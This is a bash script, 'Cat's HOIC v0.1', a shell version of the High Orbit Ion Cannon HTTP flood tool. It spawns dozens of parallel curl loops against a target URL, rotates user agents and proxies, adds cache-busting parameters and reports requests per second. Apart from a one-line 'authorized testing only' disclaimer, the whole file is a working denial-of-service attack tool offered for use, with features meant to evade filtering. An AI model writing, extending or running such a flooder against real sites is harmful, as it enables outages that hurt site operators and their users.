#!/bin/bash
# Cat's HOIC v0.1 - High Orbit Ion Cannon Shell Implementation
# WARNING: For educational and authorized testing only

cat << 'EOF'
    /\_/\
   ( o.o )
    > ^ <
  Cat's HOIC v0.1
EOF

# Configuration
TARGET_URL=""
NUM_THREADS=50
TIMEOUT=5
USER_AGENTS_FILE=""
PROXY_LIST=""
DURATION=60
LOG_FILE="hoic_attack.log"
COUNTER_FILE="/tmp/hoic_counter.$$"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default user agents
DEFAULT_USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    "Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36"
)

# Attack statistics
TOTAL_REQUESTS=0
FAILED_REQUESTS=0
START_TIME=0

print_banner() {
    clear
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║                 Cat's HOIC v0.1                       ║"
    echo "║        High Orbit Ion Cannon (Shell Edition)          ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -u, --url URL           Target URL (required)"
    echo "  -t, --threads NUM       Number of threads (default: 50)"
    echo "  -d, --duration SEC      Attack duration in seconds (default: 60)"
    echo "  -p, --proxies FILE      File containing proxy list (one per line)"
    echo "  -a, --useragents FILE   File containing user agents (one per line)"
    echo "  -T, --timeout SEC       Request timeout (default: 5)"
    echo "  -h, --help              Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -u http://target.com -t 100 -d 300"
    echo ""
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -u|--url)
                TARGET_URL="$2"
                shift 2
                ;;
            -t|--threads)
                NUM_THREADS="$2"
                shift 2
                ;;
            -d|--duration)
                DURATION="$2"
                shift 2
                ;;
            -p|--proxies)
                PROXY_LIST="$2"
                shift 2
                ;;
            -a|--useragents)
                USER_AGENTS_FILE="$2"
                shift 2
                ;;
            -T|--timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
    
    if [[ -z "$TARGET_URL" ]]; then
        echo -e "${RED}Error: Target URL is required${NC}"
        show_help
        exit 1
    fi
}

load_user_agents() {
    local agents=()
    
    if [[ -f "$USER_AGENTS_FILE" ]]; then
        mapfile -t agents < "$USER_AGENTS_FILE"
    else
        agents=("${DEFAULT_USER_AGENTS[@]}")
    fi
    
    echo "${agents[@]}"
}

load_proxies() {
    local proxies=()
    
    if [[ -f "$PROXY_LIST" ]]; then
        mapfile -t proxies < "$PROXY_LIST"
    fi
    
    echo "${proxies[@]}"
}

get_random_ua() {
    local uas=($1)
    local size=${#uas[@]}
    local index=$((RANDOM % size))
    echo "${uas[$index]}"
}

get_random_proxy() {
    local proxies=($1)
    local size=${#proxies[@]}
    
    if [[ $size -gt 0 ]]; then
        local index=$((RANDOM % size))
        echo "${proxies[$index]}"
    else
        echo ""
    fi
}

send_request() {
    local target="$1"
    local user_agents="$2"
    local proxies="$3"
    local thread_id="$4"
    
    local user_agent=$(get_random_ua "$user_agents")
    local proxy=$(get_random_proxy "$proxies")
    
    # Generate random parameters to avoid caching
    local random_param="cachebuster=$RANDOM$RANDOM"
    local full_url="${target}?${random_param}"
    
    local curl_cmd="curl -s -o /dev/null -w '%{http_code}' \
        --max-time $TIMEOUT \
        --connect-timeout $TIMEOUT \
        -H 'User-Agent: $user_agent' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
        -H 'Accept-Language: en-US,en;q=0.5' \
        -H 'Accept-Encoding: gzip, deflate' \
        -H 'Connection: keep-alive' \
        -H 'Cache-Control: no-cache' \
        -H 'Pragma: no-cache'"
    
    if [[ -n "$proxy" ]]; then
        curl_cmd="$curl_cmd --proxy '$proxy'"
    fi
    
    curl_cmd="$curl_cmd '$full_url'"
    
    while true; do
        local start=$(date +%s%N)
        local response_code=$(eval $curl_cmd 2>/dev/null)
        local end=$(date +%s%N)
        local duration=$(( (end - start) / 1000000 ))
        
        echo "$((TOTAL_REQUESTS + 1))" > "$COUNTER_FILE"
        
        if [[ "$response_code" =~ ^[0-9]+$ ]]; then
            echo -e "${GREEN}[Thread $thread_id]${NC} Sent to $target - Status: $response_code - Time: ${duration}ms"
        else
            echo -e "${RED}[Thread $thread_id]${NC} Failed - Timeout/Error"
        fi
        
        # Random delay between 0.1 and 1 second
        sleep $(awk -v min=0.1 -v max=1 'BEGIN{srand(); print min+rand()*(max-min)}')
    done
}

monitor_attack() {
    local pid=$1
    local duration=$2
    
    echo -e "${BLUE}[Monitor] Attack started for $duration seconds${NC}"
    
    for ((i=1; i<=duration; i++)); do
        if ! kill -0 $pid 2>/dev/null; then
            echo -e "${RED}[Monitor] Attack stopped unexpectedly${NC}"
            return 1
        fi
        
        if [[ -f "$COUNTER_FILE" ]]; then
            local current_count=$(cat "$COUNTER_FILE" 2>/dev/null || echo "0")
            local requests_per_sec=$((current_count / i))
            
            echo -e "${YELLOW}[Monitor] Elapsed: ${i}s | Total Requests: $current_count | RPS: $requests_per_sec${NC}"
        fi
        
        sleep 1
    done
    
    echo -e "${RED}[Monitor] Attack duration completed${NC}"
    return 0
}

cleanup() {
    echo -e "\n${RED}Stopping attack...${NC}"
    
    # Kill all child processes
    pkill -P $$
    
    # Remove counter file
    rm -f "$COUNTER_FILE"
    
    # Calculate statistics
    local end_time=$(date +%s)
    local total_time=$((end_time - START_TIME))
    
    if [[ -f "$COUNTER_FILE" ]]; then
        TOTAL_REQUESTS=$(cat "$COUNTER_FILE" 2>/dev/null || echo "0")
    fi
    
    echo -e "\n${GREEN}=== Attack Statistics ==="
    echo "Total Duration: ${total_time}s"
    echo "Total Requests: ${TOTAL_REQUESTS}"
    echo "Requests/Second: $((TOTAL_REQUESTS / (total_time > 0 ? total_time : 1)))"
    echo -e "==========================${NC}"
    
    exit 0
}

main() {
    print_banner
    parse_args "$@"
    
    echo -e "${YELLOW}Initializing Cat's HOIC...${NC}"
    echo "Target: $TARGET_URL"
    echo "Threads: $NUM_THREADS"
    echo "Duration: ${DURATION}s"
    echo ""
    
    # Load resources
    local user_agents=$(load_user_agents)
    local proxies=$(load_proxies)
    
    echo -e "${GREEN}Loaded ${#user_agents[@]} user agents${NC}"
    if [[ -n "$PROXY_LIST" ]]; then
        local proxy_count=$(echo "$proxies" | wc -w)
        echo -e "${GREEN}Loaded $proxy_count proxies${NC}"
    fi
    
    echo -e "\n${RED}Press Ctrl+C to stop the attack${NC}"
    echo -e "Starting in 3 seconds...\n"
    sleep 3
    
    # Set trap for cleanup
    trap cleanup SIGINT SIGTERM
    
    # Initialize counter
    echo "0" > "$COUNTER_FILE"
    START_TIME=$(date +%s)
    
    # Launch attack threads
    for ((i=1; i<=NUM_THREADS; i++)); do
        (send_request "$TARGET_URL" "$user_agents" "$proxies" "$i") &
    done
    
    # Monitor attack
    monitor_attack $$ "$DURATION"
    
    # Cleanup after duration
    cleanup
}

# Check for curl
if ! command -v curl &> /dev/null; then
    echo -e "${RED}Error: curl is required but not installed${NC}"
    echo "Install with: sudo apt-get install curl (Debian/Ubuntu)"
    echo "Or: sudo yum install curl (CentOS/RHEL)"
    exit 1
fi

# Run main function
main "$@"
